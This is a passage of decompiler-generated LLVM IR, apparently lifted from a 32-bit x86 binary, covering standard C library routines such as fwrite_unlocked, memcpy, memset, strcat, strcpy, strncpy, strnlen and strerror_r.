  uselistorder i32 %v6_804b6a8, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_804b6c0 = load i32, i32* @edi, align 4
  %v0_804b6c1 = load i32, i32* @esi, align 4
  %v0_804b6c2 = load i32, i32* @ebx, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v4_804b6c7 = trunc i64 %arg2 to i32
  store i32 %v4_804b6c7, i32* @esi, align 4
  store i32 %arg3, i32* @edi, align 4
  %v1_804b6cf = inttoptr i32 %arg4 to i16*
  %v2_804b6cf = load i16, i16* %v1_804b6cf, align 2
  %v1_804b6d2 = and i16 %v2_804b6cf, 192
  %v6_804b6d7 = icmp eq i16 %v1_804b6d2, 192
  br i1 %v6_804b6d7, label %dec_label_pc_804b6f2, label %dec_label_pc_804b6de

dec_label_pc_804b6de:                             ; preds = %entry
  %v0_804b6de = load i32, i32* @edx, align 4
  store i32 %arg4, i32* %stack_var_-28, align 4
  %v9_804b6e6 = call i32 @__stdio_trans2w_o(i16* %v1_804b6cf, i32 128, i32 %v0_804b6de, i32 %v0_804b6de, i32 %v0_804b6c2, i32 %v0_804b6c1, i32 %v0_804b6c0)
  %v1_804b6ee = icmp eq i32 %v9_804b6e6, 0
  %v1_804b6f0 = icmp eq i1 %v1_804b6ee, false
  br i1 %v1_804b6f0, label %dec_label_pc_804b732, label %dec_label_pc_804b6f2

dec_label_pc_804b6f2:                             ; preds = %dec_label_pc_804b6de, %entry
  %v2_804b6f2 = icmp eq i32 %v4_804b6c7, 0
  br i1 %v2_804b6f2, label %dec_label_pc_804b732, label %dec_label_pc_804b6f6

dec_label_pc_804b6f6:                             ; preds = %dec_label_pc_804b6f2
  %v1_804b6f6 = icmp eq i32 %arg3, 0
  br i1 %v1_804b6f6, label %dec_label_pc_804b732, label %dec_label_pc_804b6fa

dec_label_pc_804b6fa:                             ; preds = %dec_label_pc_804b6f6
  %v9_804b6ff = udiv i64 4294967295, %arg2
  %v10_804b6ff = trunc i64 %v9_804b6ff to i32
  %v6_804b703 = icmp ult i32 %v10_804b6ff, %arg3
  br i1 %v6_804b703, label %dec_label_pc_804b71f, label %dec_label_pc_804b705

dec_label_pc_804b705:                             ; preds = %dec_label_pc_804b6fa
  %sext = mul i64 %arg2, 4294967296
  %v2_804b708 = sdiv i64 %sext, 4294967296
  %v3_804b708 = sext i32 %arg3 to i64
  %v4_804b708 = mul nsw i64 %v3_804b708, %v2_804b708
  %v5_804b708 = trunc i64 %v4_804b708 to i32
  %v0_804b70b = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %stack_var_-28, align 4
  %v5_804b711 = call i32 @__stdio_fwrite(i32 %arg1, i32 %v5_804b708, i32 %v0_804b70b, i32 %v10_804b6ff)
  %v6_804b711 = sext i32 %v5_804b711 to i64
  %v10_804b71b = udiv i64 %v6_804b711, %arg2
  %v11_804b71b = trunc i64 %v10_804b71b to i32
  br label %dec_label_pc_804b734

dec_label_pc_804b71f:                             ; preds = %dec_label_pc_804b6fa
  %v0_804b71f = load i32, i32* @ebx, align 4
  %v1_804b71f = inttoptr i32 %v0_804b71f to i32*
  %v2_804b71f = load i32, i32* %v1_804b71f, align 4
  %v1_804b721 = or i32 %v2_804b71f, 8
  %v1_804b724 = trunc i32 %v1_804b721 to i16
  %v3_804b724 = inttoptr i32 %v0_804b71f to i16*
  store i16 %v1_804b724, i16* %v3_804b724, align 2
  %v0_804b727 = load i32, i32* %stack_var_-28, align 4
  %v1_804b727 = call i32 @__errno_location(i32 %v0_804b727)
  %v1_804b72c = inttoptr i32 %v1_804b727 to i32*
  store i32 22, i32* %v1_804b72c, align 4
  br label %dec_label_pc_804b732

dec_label_pc_804b732:                             ; preds = %dec_label_pc_804b6f6, %dec_label_pc_804b6f2, %dec_label_pc_804b6de, %dec_label_pc_804b71f
  br label %dec_label_pc_804b734

dec_label_pc_804b734:                             ; preds = %dec_label_pc_804b705, %dec_label_pc_804b732
  %v0_804b737 = phi i32 [ %v11_804b71b, %dec_label_pc_804b705 ], [ 0, %dec_label_pc_804b732 ]
  store i32 %v0_804b6c1, i32* @esi, align 4
  store i32 %v0_804b6c0, i32* @edi, align 4
  ret i32 %v0_804b737

; uselistorder directives
  uselistorder i32 %v0_804b6de, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__stdio_fwrite, { 5, 4, 3, 1, 0, 6, 2 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder i64 %arg2, { 2, 0, 1, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804b734, { 1, 0 }
  uselistorder label %dec_label_pc_804b732, { 3, 0, 1, 2 }
}

define i32 @memcpy(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804b739 = load i32, i32* @esi, align 4
  store i32 %v0_804b739, i32* %stack_var_-8, align 4
  %sext = mul i32 %arg3, 16777216
  %v4_804b73a = sdiv i32 %sext, 16777216
  store i32 %v4_804b73a, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_804b742 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804b742, i32* %edi.global-to-local, align 4
  %v2_804b748 = udiv i32 %v4_804b73a, 4
  %v3_804b74b = inttoptr i32 %arg2 to i8*
  %v4_804b74b = bitcast i16* %arg1 to i8*
  %v5_804b74b = call i8* @_memcpy(i8* %v4_804b74b, i8* %v3_804b74b, i32 %v2_804b748)
  %v6_804b74b = ptrtoint i8* %v5_804b74b to i32
  store i32 %v6_804b74b, i32* @ecx, align 4
  %v0_804b74d = load i32, i32* %eax.global-to-local, align 4
  %v2_804b74d = and i32 %v0_804b74d, 2
  %v3_804b74d = icmp eq i32 %v2_804b74d, 0
  br i1 %v3_804b74d, label %dec_label_pc_804b753, label %dec_label_pc_804b751

dec_label_pc_804b751:                             ; preds = %entry
  %v0_804b751 = load i32, i32* %esi.global-to-local, align 4
  %v1_804b751 = inttoptr i32 %v0_804b751 to i16*
  %v2_804b751 = load i16, i16* %v1_804b751, align 2
  %v3_804b751 = load i32, i32* %edi.global-to-local, align 4
  %v4_804b751 = inttoptr i32 %v3_804b751 to i16*
  store i16 %v2_804b751, i16* %v4_804b751, align 2
  %v5_804b751 = load i32, i32* %edi.global-to-local, align 4
  %v6_804b751 = load i32, i32* %esi.global-to-local, align 4
  %v7_804b751 = load i1, i1* @df, align 1
  %v8_804b751 = select i1 %v7_804b751, i32 -2, i32 2
  %v9_804b751 = add i32 %v8_804b751, %v5_804b751
  %v10_804b751 = add i32 %v8_804b751, %v6_804b751
  store i32 %v9_804b751, i32* %edi.global-to-local, align 4
  store i32 %v10_804b751, i32* %esi.global-to-local, align 4
  %v0_804b753.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b753

dec_label_pc_804b753:                             ; preds = %entry, %dec_label_pc_804b751
  %v0_804b753 = phi i32 [ %v0_804b74d, %entry ], [ %v0_804b753.pre, %dec_label_pc_804b751 ]
  %v2_804b753 = urem i32 %v0_804b753, 2
  %v3_804b753 = icmp eq i32 %v2_804b753, 0
  br i1 %v3_804b753, label %dec_label_pc_804b758, label %dec_label_pc_804b757

dec_label_pc_804b757:                             ; preds = %dec_label_pc_804b753
  %v0_804b757 = load i32, i32* %esi.global-to-local, align 4
  %v1_804b757 = inttoptr i32 %v0_804b757 to i8*
  %v2_804b757 = load i8, i8* %v1_804b757, align 1
  %v3_804b757 = load i32, i32* %edi.global-to-local, align 4
  %v4_804b757 = inttoptr i32 %v3_804b757 to i8*
  store i8 %v2_804b757, i8* %v4_804b757, align 1
  %v5_804b757 = load i32, i32* %edi.global-to-local, align 4
  %v6_804b757 = load i32, i32* %esi.global-to-local, align 4
  %v7_804b757 = load i1, i1* @df, align 1
  %v8_804b757 = select i1 %v7_804b757, i32 -1, i32 1
  %v9_804b757 = add i32 %v8_804b757, %v5_804b757
  %v10_804b757 = add i32 %v8_804b757, %v6_804b757
  store i32 %v9_804b757, i32* %edi.global-to-local, align 4
  store i32 %v10_804b757, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804b758

dec_label_pc_804b758:                             ; preds = %dec_label_pc_804b753, %dec_label_pc_804b757
  store i32 %v4_804b742, i32* %eax.global-to-local, align 4
  %v2_804b75c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804b75c, i32* @esi, align 4
  ret i32 %v4_804b742

; uselistorder directives
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder label %dec_label_pc_804b758, { 1, 0 }
  uselistorder label %dec_label_pc_804b753, { 1, 0 }
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_804b760 = load i32, i32* @edi, align 4
  %v4_804b769 = ptrtoint i8* %arg1 to i32
  %v5_804b76d = call i8* @_memset(i8* %arg1, i32 %arg2, i32 %arg3)
  %v6_804b76d = ptrtoint i8* %v5_804b76d to i32
  store i32 %v6_804b76d, i32* @ecx, align 4
  store i32 %v0_804b760, i32* @edi, align 4
  ret i32 %v4_804b769

; uselistorder directives
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @strcat(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_804b77b = load i32, i32* @esi, align 4
  store i32 %v0_804b77b, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_804b783 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804b783, i32* %edi.global-to-local, align 4
  %v3_804b787 = call i32 @_strlen(i8* %arg1)
  %v2_804b789 = add i32 %v4_804b783, -1
  store i32 %v2_804b789, i32* %edi.global-to-local, align 4
  %v4_804b78a.pre = load i32, i32* %eax.global-to-local, align 4
  %v8_804b78a.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_804b78a

dec_label_pc_804b78a:                             ; preds = %dec_label_pc_804b78a, %entry
  %v2_804b78b = phi i32 [ %v7_804b78b, %dec_label_pc_804b78a ], [ %v2_804b789, %entry ]
  %v8_804b78a = phi i1 [ %v5_804b78b, %dec_label_pc_804b78a ], [ %v8_804b78a.pre, %entry ]
  %v4_804b78a = phi i32 [ %v0_804b78c, %dec_label_pc_804b78a ], [ %v4_804b78a.pre, %entry ]
  %v0_804b78a = load i32, i32* %esi.global-to-local, align 4
  %v1_804b78a = inttoptr i32 %v0_804b78a to i8*
  %v2_804b78a = load i8, i8* %v1_804b78a, align 1
  %v3_804b78a = zext i8 %v2_804b78a to i32
  %v5_804b78a = and i32 %v4_804b78a, -256
  %v6_804b78a = or i32 %v3_804b78a, %v5_804b78a
  store i32 %v6_804b78a, i32* %eax.global-to-local, align 4
  %v9_804b78a = select i1 %v8_804b78a, i32 -1, i32 1
  %v10_804b78a = add i32 %v0_804b78a, %v9_804b78a
  store i32 %v10_804b78a, i32* %esi.global-to-local, align 4
  %v3_804b78b = inttoptr i32 %v2_804b78b to i8*
  store i8 %v2_804b78a, i8* %v3_804b78b, align 1
  %v4_804b78b = load i32, i32* %edi.global-to-local, align 4
  %v5_804b78b = load i1, i1* @df, align 1
  %v6_804b78b = select i1 %v5_804b78b, i32 -1, i32 1
  %v7_804b78b = add i32 %v6_804b78b, %v4_804b78b
  store i32 %v7_804b78b, i32* %edi.global-to-local, align 4
  %v0_804b78c = load i32, i32* %eax.global-to-local, align 4
  %v3_804b78c = trunc i32 %v0_804b78c to i8
  %v4_804b78c = icmp eq i8 %v3_804b78c, 0
  %v1_804b78e = icmp eq i1 %v4_804b78c, false
  br i1 %v1_804b78e, label %dec_label_pc_804b78a, label %dec_label_pc_804b790

dec_label_pc_804b790:                             ; preds = %dec_label_pc_804b78a
  store i32 %v4_804b783, i32* %eax.global-to-local, align 4
  %v2_804b794 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804b794, i32* @esi, align 4
  ret i32 %v4_804b783

; uselistorder directives
  uselistorder i32 %v0_804b78c, { 1, 0 }
  uselistorder i32 %v7_804b78b, { 1, 0 }
  uselistorder i1 %v5_804b78b, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804b799 = load i32, i32* @esi, align 4
  store i32 %v0_804b799, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_804b7a1 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804b7a1, i32* %edi.global-to-local, align 4
  %v4_804b7a5.pre = load i32, i32* @eax, align 4
  %v8_804b7a5.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_804b7a5

dec_label_pc_804b7a5:                             ; preds = %dec_label_pc_804b7a5.dec_label_pc_804b7a5_crit_edge, %entry
  %v2_804b7a6 = phi i32 [ %v7_804b7a6, %dec_label_pc_804b7a5.dec_label_pc_804b7a5_crit_edge ], [ %v4_804b7a1, %entry ]
  %v8_804b7a5 = phi i1 [ %v5_804b7a6, %dec_label_pc_804b7a5.dec_label_pc_804b7a5_crit_edge ], [ %v8_804b7a5.pre, %entry ]
  %v4_804b7a5 = phi i32 [ %v0_804b7a7, %dec_label_pc_804b7a5.dec_label_pc_804b7a5_crit_edge ], [ %v4_804b7a5.pre, %entry ]
  %v7_804b7a5 = phi i32 [ %v0_804b7a5.pre, %dec_label_pc_804b7a5.dec_label_pc_804b7a5_crit_edge ], [ %arg2, %entry ]
  %v1_804b7a5 = inttoptr i32 %v7_804b7a5 to i8*
  %v2_804b7a5 = load i8, i8* %v1_804b7a5, align 1
  %v3_804b7a5 = zext i8 %v2_804b7a5 to i32
  %v5_804b7a5 = and i32 %v4_804b7a5, -256
  %v6_804b7a5 = or i32 %v3_804b7a5, %v5_804b7a5
  store i32 %v6_804b7a5, i32* %eax.global-to-local, align 4
  %v9_804b7a5 = select i1 %v8_804b7a5, i32 -1, i32 1
  %v10_804b7a5 = add i32 %v7_804b7a5, %v9_804b7a5
  store i32 %v10_804b7a5, i32* %esi.global-to-local, align 4
  %v3_804b7a6 = inttoptr i32 %v2_804b7a6 to i8*
  store i8 %v2_804b7a5, i8* %v3_804b7a6, align 1
  %v4_804b7a6 = load i32, i32* %edi.global-to-local, align 4
  %v5_804b7a6 = load i1, i1* @df, align 1
  %v6_804b7a6 = select i1 %v5_804b7a6, i32 -1, i32 1
  %v7_804b7a6 = add i32 %v6_804b7a6, %v4_804b7a6
  store i32 %v7_804b7a6, i32* %edi.global-to-local, align 4
  %v0_804b7a7 = load i32, i32* %eax.global-to-local, align 4
  %v3_804b7a7 = trunc i32 %v0_804b7a7 to i8
  %v4_804b7a7 = icmp eq i8 %v3_804b7a7, 0
  %v1_804b7a9 = icmp eq i1 %v4_804b7a7, false
  br i1 %v1_804b7a9, label %dec_label_pc_804b7a5.dec_label_pc_804b7a5_crit_edge, label %dec_label_pc_804b7ab

dec_label_pc_804b7a5.dec_label_pc_804b7a5_crit_edge: ; preds = %dec_label_pc_804b7a5
  %v0_804b7a5.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804b7a5

dec_label_pc_804b7ab:                             ; preds = %dec_label_pc_804b7a5
  store i32 %v4_804b7a1, i32* %eax.global-to-local, align 4
  %v2_804b7af = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804b7af, i32* @edx, align 4
  %v2_804b7b0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804b7b0, i32* @esi, align 4
  ret i32 %v4_804b7a1

; uselistorder directives
  uselistorder i32 %v0_804b7a7, { 1, 0 }
  uselistorder i32 %v7_804b7a6, { 1, 0 }
  uselistorder i1 %v5_804b7a6, { 1, 0 }
  uselistorder i32 %v4_804b7a1, { 1, 2, 0, 3 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @strncpy(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804b7c9 = load i32, i32* @esi, align 4
  store i32 %v0_804b7c9, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_804b7d5 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804b7d5, i32* %edi.global-to-local, align 4
  %v1_804b7d9 = add i32 %arg3, 1
  store i32 %v1_804b7d9, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804b7da

dec_label_pc_804b7da:                             ; preds = %dec_label_pc_804b7dd, %entry
  %v3_804b7de = phi i32 [ %v4_804b7d5, %entry ], [ %v8_804b7de, %dec_label_pc_804b7dd ]
  %v0_804b7da = phi i32 [ %v1_804b7d9, %entry ], [ %v0_804b7da.pre, %dec_label_pc_804b7dd ]
  %v1_804b7da = add i32 %v0_804b7da, -1
  %v8_804b7da = icmp eq i32 %v1_804b7da, 0
  store i32 %v1_804b7da, i32* %ecx.global-to-local, align 4
  br i1 %v8_804b7da, label %.loopexit, label %dec_label_pc_804b7dd

dec_label_pc_804b7dd:                             ; preds = %dec_label_pc_804b7da
  %v0_804b7dd = load i32, i32* %esi.global-to-local, align 4
  %v1_804b7dd = inttoptr i32 %v0_804b7dd to i8*
  %v2_804b7dd = load i8, i8* %v1_804b7dd, align 1
  %v10_804b7dd = load i1, i1* @df, align 1
  %v11_804b7dd = select i1 %v10_804b7dd, i32 -1, i32 1
  %v12_804b7dd = add i32 %v11_804b7dd, %v0_804b7dd
  store i32 %v12_804b7dd, i32* %esi.global-to-local, align 4
  %v4_804b7de = inttoptr i32 %v3_804b7de to i8*
  store i8 %v2_804b7dd, i8* %v4_804b7de, align 1
  %v5_804b7de = load i32, i32* %edi.global-to-local, align 4
  %v6_804b7de = load i1, i1* @df, align 1
  %v7_804b7de = select i1 %v6_804b7de, i32 -1, i32 1
  %v8_804b7de = add i32 %v7_804b7de, %v5_804b7de
  store i32 %v8_804b7de, i32* %edi.global-to-local, align 4
  %v6_804b7df = icmp eq i8 %v2_804b7dd, 0
  %v1_804b7e1 = icmp eq i1 %v6_804b7df, false
  %v0_804b7da.pre = load i32, i32* %ecx.global-to-local, align 4
  br i1 %v1_804b7e1, label %dec_label_pc_804b7da, label %dec_label_pc_804b7e3

dec_label_pc_804b7e3:                             ; preds = %dec_label_pc_804b7dd
  %v1_804b7e3 = add i32 %v0_804b7da.pre, -1
  store i32 %v1_804b7e3, i32* %ecx.global-to-local, align 4
  %v2_804b7e4 = sext i8 %v2_804b7dd to i32
  %v4_804b7e4 = inttoptr i32 %v8_804b7de to i8*
  %v5_804b7e4 = call i8* @_memset(i8* %v4_804b7e4, i32 %v2_804b7e4, i32 %v1_804b7e3)
  %v6_804b7e4 = ptrtoint i8* %v5_804b7e4 to i32
  store i32 %v6_804b7e4, i32* %ecx.global-to-local, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_804b7da, %dec_label_pc_804b7e3
  %v2_804b7ea = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804b7ea, i32* @edx, align 4
  %v2_804b7eb = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804b7eb, i32* @esi, align 4
  ret i32 %v4_804b7d5

; uselistorder directives
  uselistorder i32 %v8_804b7de, { 0, 2, 1 }
  uselistorder i8 %v2_804b7dd, { 0, 2, 1 }
  uselistorder i32 %v1_804b7da, { 1, 0 }
  uselistorder i32 %v4_804b7d5, { 1, 0, 2 }
  uselistorder label %.loopexit, { 1, 0 }
}

define i32 @strnlen() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8* @__decompiler_undefined_function_2()
  %v4_804b7f0 = ptrtoint i8* %tmp4 to i32
  %v8_804b8038 = icmp eq i32 %tmp, 0
  %v1_804b80410 = icmp eq i1 %v8_804b8038, false
  br i1 %v1_804b80410, label %dec_label_pc_804b7fd, label %dec_label_pc_804b806

dec_label_pc_804b7fd:                             ; preds = %entry, %dec_label_pc_804b802
  %v1_804b80312 = phi i32 [ %v1_804b803, %dec_label_pc_804b802 ], [ %tmp, %entry ]
  %v0_804b80611 = phi i32 [ %v1_804b802, %dec_label_pc_804b802 ], [ %v4_804b7f0, %entry ]
  %v1_804b7fd = inttoptr i32 %v0_804b80611 to i8*
  %v2_804b7fd = load i8, i8* %v1_804b7fd, align 1
  %v3_804b7fd = icmp eq i8 %v2_804b7fd, 0
  br i1 %v3_804b7fd, label %dec_label_pc_804b806, label %dec_label_pc_804b802

dec_label_pc_804b802:                             ; preds = %dec_label_pc_804b7fd
  %v1_804b802 = add i32 %v0_804b80611, 1
  %v1_804b803 = add i32 %v1_804b80312, -1
  %v8_804b803 = icmp eq i32 %v1_804b803, 0
  %v1_804b804 = icmp eq i1 %v8_804b803, false
  br i1 %v1_804b804, label %dec_label_pc_804b7fd, label %dec_label_pc_804b806

dec_label_pc_804b806:                             ; preds = %dec_label_pc_804b802, %dec_label_pc_804b7fd, %entry
  %v0_804b806.lcssa = phi i32 [ %v4_804b7f0, %entry ], [ %v0_804b80611, %dec_label_pc_804b7fd ], [ %v1_804b802, %dec_label_pc_804b802 ]
  %v2_804b806 = sub i32 %v0_804b806.lcssa, %v4_804b7f0
  ret i32 %v2_804b806

; uselistorder directives
  uselistorder i32 %v1_804b803, { 1, 0 }
  uselistorder i32 %v0_804b80611, { 0, 2, 1 }
  uselistorder i32 %v4_804b7f0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804b7fd, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp2, i32* @ebx, align 4
  %v3_804b81d = call i32 @__xpg_strerror_r(i32 %tmp, i32 %tmp2, i32 %tmp1)
  %v0_804b825 = load i32, i32* @ebx, align 4
  ret i32 %v0_804b825
}

define i32 @__xpg_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-108 = alloca i8*, align 4
  store i32 %arg3, i32* @edi, align 4
  %v6_804b83e = icmp ugt i32 %arg1, 124
  br i1 %v6_804b83e, label %dec_label_pc_804b85b, label %dec_label_pc_804b840

dec_label_pc_804b840:                             ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_80518a0.332 to i32), i32* @esi, align 4
  %v1_804b8504 = icmp eq i32 %arg1, 0
  %v1_804b85211 = icmp eq i1 %v1_804b8504, false
  br i1 %v1_804b85211, label %dec_label_pc_804b849, label %dec_label_pc_804b854

dec_label_pc_804b849:                             ; preds = %dec_label_pc_804b840, %dec_label_pc_804b849
  %v0_804b84c = phi i32 [ %v3_804b84c, %dec_label_pc_804b849 ], [ %arg1, %dec_label_pc_804b840 ]
  %v0_804b84f = phi i32 [ %v1_804b84f, %dec_label_pc_804b849 ], [ ptrtoint ([8 x i8]* @global_var_80518a0.332 to i32), %dec_label_pc_804b840 ]
  %v1_804b849 = inttoptr i32 %v0_804b84f to i8*
  %v2_804b849 = load i8, i8* %v1_804b849, align 1
  %v7_804b849 = icmp eq i8 %v2_804b849, 0
  %v2_804b84c = zext i1 %v7_804b849 to i32
  %v3_804b84c = add i32 %v2_804b84c, %v0_804b84c
  %v16_804b84c = icmp eq i32 %v3_804b84c, 0
  %v1_804b84f = add i32 %v0_804b84f, 1
  store i32 %v1_804b84f, i32* @esi, align 4
  %v1_804b852 = icmp eq i1 %v16_804b84c, false
  br i1 %v1_804b852, label %dec_label_pc_804b849, label %dec_label_pc_804b854

dec_label_pc_804b854:                             ; preds = %dec_label_pc_804b849, %dec_label_pc_804b840
  %v0_804b856 = phi i32 [ ptrtoint ([8 x i8]* @global_var_80518a0.332 to i32), %dec_label_pc_804b840 ], [ %v1_804b84f, %dec_label_pc_804b849 ]
  store i32 0, i32* @ebp, align 4
  %v1_804b856 = inttoptr i32 %v0_804b856 to i8*
  %v2_804b856 = load i8, i8* %v1_804b856, align 1
  %v3_804b856 = icmp eq i8 %v2_804b856, 0
  %v1_804b859 = icmp eq i1 %v3_804b856, false
  br i1 %v1_804b859, label %dec_label_pc_804b854.dec_label_pc_804b88a_crit_edge, label %dec_label_pc_804b85b

dec_label_pc_804b854.dec_label_pc_804b88a_crit_edge: ; preds = %dec_label_pc_804b854
  br label %dec_label_pc_804b88a

dec_label_pc_804b85b:                             ; preds = %dec_label_pc_804b854, %entry
  %v1_804b85e = ashr i32 %arg1, 31
  store i8* null, i8** %stack_var_-108, align 4
  store i32 22, i32* @ebp, align 4
  %v6_804b86f = bitcast i32* %stack_var_-17 to i8*
  %v7_804b86f = call i32 @_uintmaxtostr(i8* %v6_804b86f, i32 %arg1, i32 %v1_804b85e, i32 -10, i32 0)
  %v1_804b87e = add i32 %v7_804b86f, -14
  store i32 %v1_804b87e, i32* @esi, align 4
  %v5_804b881 = inttoptr i32 %v1_804b87e to i8*
  store i8* %v5_804b881, i8** %stack_var_-108, align 4
  %tmp44 = inttoptr i32 %v1_804b87e to i16*
  %v6_804b882 = call i32 @memcpy(i16* %tmp44, i32 ptrtoint ([15 x i8]* @global_var_8051876.333 to i32), i32 14)
  %v1_804b894.pre = load i32, i32* @edi, align 4
  %v0_804b89a.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804b88a

dec_label_pc_804b88a:                             ; preds = %dec_label_pc_804b854.dec_label_pc_804b88a_crit_edge, %dec_label_pc_804b85b
  %v0_804b89a = phi i32 [ %v0_804b856, %dec_label_pc_804b854.dec_label_pc_804b88a_crit_edge ], [ %v0_804b89a.pre, %dec_label_pc_804b85b ]
  %v1_804b894 = phi i32 [ %arg3, %dec_label_pc_804b854.dec_label_pc_804b88a_crit_edge ], [ %v1_804b894.pre, %dec_label_pc_804b85b ]
  %v4_804b88a = icmp eq i32 %arg2, 0
  %v3_804b894 = select i1 %v4_804b88a, i32 0, i32 %v1_804b894
  store i32 %v3_804b894, i32* @edi, align 4
  %v5_804b89a = inttoptr i32 %v0_804b89a to i8*
  store i8* %v5_804b89a, i8** %stack_var_-108, align 4
  %v3_804b89b = call i32 @strlen(i8* %v5_804b89a)
  %v1_804b8a3 = add i32 %v3_804b89b, 1
  store i32 %v1_804b8a3, i32* %ebx.global-to-local, align 4
  %v1_804b8a6 = load i32, i32* @edi, align 4
  %tmp = icmp ugt i32 %v1_804b8a3, %v1_804b8a6
  br i1 %tmp, label %dec_label_pc_804b8aa, label %dec_label_pc_804b8b1

dec_label_pc_804b8aa:                             ; preds = %dec_label_pc_804b88a
  store i32 %v1_804b8a6, i32* %ebx.global-to-local, align 4
  store i32 34, i32* @ebp, align 4
  br label %dec_label_pc_804b8b1

dec_label_pc_804b8b1:                             ; preds = %dec_label_pc_804b88a, %dec_label_pc_804b8aa
  %v0_804b8b6 = phi i32 [ %v1_804b8a3, %dec_label_pc_804b88a ], [ %v1_804b8a6, %dec_label_pc_804b8aa ]
  %v1_804b8b1 = icmp eq i32 %v0_804b8b6, 0
  br i1 %v1_804b8b1, label %dec_label_pc_804b8cd, label %dec_label_pc_804b8b5

dec_label_pc_804b8b5:                             ; preds = %dec_label_pc_804b8b1
  %v0_804b8b7 = load i32, i32* @esi, align 4
  %v8_804b8b8 = inttoptr i32 %arg2 to i8*
  store i8* %v8_804b8b8, i8** %stack_var_-108, align 4
  %tmp45 = inttoptr i32 %arg2 to i16*
  %v6_804b8bc = call i32 @memcpy(i16* %tmp45, i32 %v0_804b8b7, i32 %v0_804b8b6)
  %v1_804b8c8 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804b8c8 = add i32 %arg2, -1
  %v3_804b8c8 = add i32 %v2_804b8c8, %v1_804b8c8
  %v4_804b8c8 = inttoptr i32 %v3_804b8c8 to i8*
  store i8 0, i8* %v4_804b8c8, align 1
  br label %dec_label_pc_804b8cd

dec_label_pc_804b8cd:                             ; preds = %dec_label_pc_804b8b1, %dec_label_pc_804b8b5
  %v0_804b8cd = load i32, i32* @ebp, align 4
  %v1_804b8cd = icmp eq i32 %v0_804b8cd, 0
  br i1 %v1_804b8cd, label %dec_label_pc_804b8d8, label %dec_label_pc_804b8d1

dec_label_pc_804b8d1:                             ; preds = %dec_label_pc_804b8cd
  %v0_804b8d1 = load i8*, i8** %stack_var_-108, align 4
  %v1_804b8d1 = ptrtoint i8* %v0_804b8d1 to i32
  %v2_804b8d1 = call i32 @__errno_location(i32 %v1_804b8d1)
  %v0_804b8d6 = load i32, i32* @ebp, align 4
  %v2_804b8d6 = inttoptr i32 %v2_804b8d1 to i32*
  store i32 %v0_804b8d6, i32* %v2_804b8d6, align 4
  %v0_804b8db.pre = load i32, i32* @ebp, align 4
